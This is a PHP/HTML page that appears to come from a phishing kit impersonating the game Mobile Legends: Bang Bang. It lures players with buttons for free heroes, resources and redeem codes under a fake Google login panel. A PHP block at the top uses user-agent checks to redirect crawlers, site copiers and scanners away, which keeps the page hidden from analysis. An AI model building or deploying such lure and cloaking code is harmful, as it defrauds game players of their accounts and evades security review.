<!---

Author Real Name: Arfan Rizki Ramadhan
Author Alias Name: RAFLIPEDIA
Author URL: raflip-edia.blogspot.com
Date Created: 14 August 2017 at 8:03 WIB
Thanks to: MALASNGODING
Note: PLEASE DO NOT CHANGE THIS COPYRIGHT! 

--->
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.raflipedia.club/');
die();
}
?>
<html>
<head>
<meta charset="UTF-8">
<title>Mobile Legends - Bang Bang</title>
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="assets/css/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="assets/js/jquery-1.10.2.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="assets/js/custom.js"></script>
<meta name="description" content="Join the Mobile Legends - Bang Bang new event! And get what do you want!"/>
</head>
<body  style="background: #000 url('img/bgnya.jpg') top center no-repeat;">


<div class="container">
<nav class="navbar navbar-inverse navbar-fixed-top">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="/">Mobile Legends</a>
</div>
<div id="navbar" class="collapse navbar-collapse">


<ul class="nav navbar-nav navbar-right">
<li><a href="index.php"><i class="fa fa-sign-out"></i> Sign out</a></li>
</ul>
	  
</div>
</div>
</nav>






<div class="container">
<div class="panel panel-info" >
<div class="panel-heading">
<div class="panel-title"><i class="fa fa-google-plus"></i> Mobile Legends Google</div>
</div>     

<div style="padding-top:30px" class="panel-body" >
<div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
<form id="loginform" class="form-horizontal" method="post" role="form">

<center><img height="200" width="400" src="img/logonye.png"></center>

</br>

<center><h1>Select your tools what you want.</h1></center>

</br>

<center>
<button type="submit" name="starlight" id="starlight" class="btn btn-danger"><i class="fa fa-user"></i> Free Starlight Hero</button> 
<button type="submit" name="resource" id="resource" class="btn btn-danger"><i class="fa fa-diamond"></i> Free Resource</button> 
<button type="submit" name="redeem" id="redeem" class="btn btn-danger"><i class="fa fa-gift"></i> Free Redeemtion Code</button>
</center>
</form> 







</body>
</html>